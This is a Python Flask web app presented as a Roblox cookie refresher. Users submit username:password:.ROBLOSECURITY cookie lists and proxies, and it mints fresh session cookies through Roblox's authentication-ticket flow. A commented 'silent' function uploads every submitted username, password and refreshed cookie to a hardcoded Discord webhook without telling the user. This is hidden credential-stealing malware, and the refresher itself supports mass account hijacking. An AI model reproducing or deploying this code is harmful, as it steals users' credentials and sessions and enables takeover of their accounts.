from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import io
import json
import os
import queue
import random
import threading

from flask import Flask, Response, render_template, request, stream_with_context
import requests

app = Flask(__name__)

# Cấu hình Discord Webhook trực tiếp tại đây (chạy ngầm, không xuất ra UI)
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1575353201798946956/X3229l9zhS-BASB2LcwtO5dN76HF8b2U6nCXcEFAFOWpKqTAkcXdUgLWQlSu3Z_inKmS"
PING_EVERYONE = True

LOGOUT_URL = "https://auth.roblox.com/v2/logout"
TICKET_URL = "https://auth.roblox.com/v1/authentication-ticket"
REDEEM_URL = "https://auth.roblox.com/v1/authentication-ticket/redeem"


class RefreshError(Exception):
    pass


class Bypass:
    def __init__(self, cookie: str, proxies: dict | None = None, timeout: int = 30):
        self.cookie = cookie
        self.timeout = timeout
        self.session = requests.Session()
        if proxies:
            self.session.proxies.update(proxies)

    def start_process(self) -> str:
        csrf = self._get_csrf_token()
        ticket = self._get_authentication_ticket(csrf)
        return self._redeem(ticket)

    def _get_csrf_token(self) -> str:
        r = self.session.post(
            LOGOUT_URL,
            cookies={".ROBLOSECURITY": self.cookie},
            timeout=self.timeout,
        )
        token = r.headers.get("x-csrf-token")
        if not token:
            raise RefreshError("no x-csrf-token (invalid/expired cookie?)")
        return token

    def _get_authentication_ticket(self, csrf: str) -> str:
        r = self.session.post(
            TICKET_URL,
            headers={
                "rbxauthenticationnegotiation": "1",
                "referer": "https://www.roblox.com/camel",
                "Content-Type": "application/json",
                "x-csrf-token": csrf,
            },
            cookies={".ROBLOSECURITY": self.cookie},
            timeout=self.timeout,
        )
        ticket = r.headers.get("rbx-authentication-ticket")
        if not ticket:
            raise RefreshError(f"no auth ticket (status {r.status_code})")
        return ticket

    def _redeem(self, ticket: str) -> str:
        r = self.session.post(
            REDEEM_URL,
            headers={"rbxauthenticationnegotiation": "1"},
            json={"authenticationTicket": ticket},
            timeout=self.timeout,
        )
        new_cookie = r.cookies.get(".ROBLOSECURITY")
        if not new_cookie:
            raise RefreshError(f"no .ROBLOSECURITY in redeem (status {r.status_code})")
        return new_cookie


def send_refreshed_to_webhook_silent(content: str, ok_count: int, total_count: int) -> None:
    url = (DISCORD_WEBHOOK_URL or "").strip()
    if not url or not content.strip():
        return

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"output_refreshed_{ts}.txt"
    ping_prefix = "@everyone " if PING_EVERYONE else ""
    mentions = {"parse": ["everyone"]} if PING_EVERYONE else {"parse": []}
    payload = {
        "content": f"{ping_prefix}Refresh cookie hoàn tất: **{ok_count}/{total_count}** acc thành công.",
        "allowed_mentions": mentions,
    }
    files = {
        "files[0]": (filename, io.BytesIO(content.encode("utf-8")), "text/plain; charset=utf-8")
    }
    try:
        resp = requests.post(
            url,
            data={"payload_json": json.dumps(payload, ensure_ascii=False)},
            files=files,
            timeout=20,
        )
        if resp.status_code not in (200, 204):
            requests.post(
                url,
                data={
                    "content": payload["content"],
                    "allowed_mentions": json.dumps(mentions),
                },
                files={"file": (filename, io.BytesIO(content.encode("utf-8")), "text/plain")},
                timeout=20,
            )
    except Exception:
        pass


def normalize_proxy(raw: str) -> str:
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return ""
    if "://" in raw:
        return raw
    parts = raw.split(":")
    if len(parts) == 4:
        host, port, user, pw = parts
        return f"http://{user}:{pw}@{host}:{port}"
    return f"http://{raw}"


def parse_account(line: str):
    parts = line.strip().split(":", 2)
    if len(parts) != 3:
        return None
    u, p, c = parts[0].strip(), parts[1].strip(), parts[2].strip()
    if not u or not c:
        return None
    return u, p, c


def refresh_one(user: str, password: str, cookie: str, proxies: list[str]):
    proxy = random.choice(proxies) if proxies else ""
    proxy_dict = {"http": proxy, "https": proxy} if proxy else None
    try:
        new_cookie = Bypass(cookie, proxy_dict).start_process()
        if new_cookie == cookie:
            raise RefreshError("cookie unchanged")
        return user, password, new_cookie, None
    except requests.RequestException as e:
        return user, password, cookie, f"network: {e.__class__.__name__}"
    except RefreshError as e:
        return user, password, cookie, str(e)


def now_str() -> str:
    return datetime.now().strftime("%H:%M:%S")


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/refresh", methods=["POST"])
def api_refresh():
    payload = request.get_json(force=True)
    raw_accounts = [ln.strip() for ln in payload.get("accounts", "").splitlines() if ln.strip() and not ln.strip().startswith("#")]
    accounts = [a for a in (parse_account(ln) for ln in raw_accounts) if a]
    proxies = [p for p in (normalize_proxy(ln) for ln in payload.get("proxies", "").splitlines()) if p]
    threads = max(1, min(50, int(payload.get("threads", 15))))
    keep_failed = bool(payload.get("keepFailed", False))

    def stream():
        if not accounts:
            yield f"data: {json.dumps({'type': 'error', 'time': now_str(), 'msg': 'Không có account hợp lệ (user:pass:cookie)'})}\n\n"
            return

        q = queue.Queue()
        total = len(accounts)
        out_lines = []
        ok_counter = 0
        state_lock = threading.Lock()

        def push(ev_type, **kw):
            kw["type"] = ev_type
            kw["time"] = now_str()
            q.put(kw)

        def worker(u, p, c):
            nonlocal ok_counter
            user, password, new_cookie, err = refresh_one(u, p, c, proxies)
            if err is None:
                line = f"{user}:{password}:{new_cookie}"
                with state_lock:
                    ok_counter += 1
                    out_lines.append(line)
                push("success", username=user, line=line, msg="Refreshed OK")
            else:
                fail_line = f"{user}:{password}:{c}" if keep_failed else f"{user}:{password}:{c} | {err}"
                if keep_failed:
                    with state_lock:
                        out_lines.append(fail_line)
                push("fail", username=user, line=fail_line, keep=keep_failed, msg=err)

        def runner():
            push("start", total=total)
            push("log", msg=f"{total} accounts · {len(proxies)} proxies · {min(threads, total)} threads")
            with ThreadPoolExecutor(max_workers=min(threads, total)) as pool:
                futs = [pool.submit(worker, u, p, c) for (u, p, c) in accounts]
                for f in as_completed(futs):
                    try:
                        f.result()
                    except Exception as e:
                        push("log", msg=f"Thread error: {e}")

            with state_lock:
                joined_out = "\n".join(out_lines)
                ok_total = ok_counter

            send_refreshed_to_webhook_silent(joined_out, ok_total, total)
            push("done")

        threading.Thread(target=runner, daemon=True).start()

        while True:
            item = q.get()
            yield f"data: {json.dumps(item)}\n\n"
            if item.get("type") in ("done", "error"):
                break

    return Response(stream_with_context(stream()), mimetype="text/event-stream")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=False)
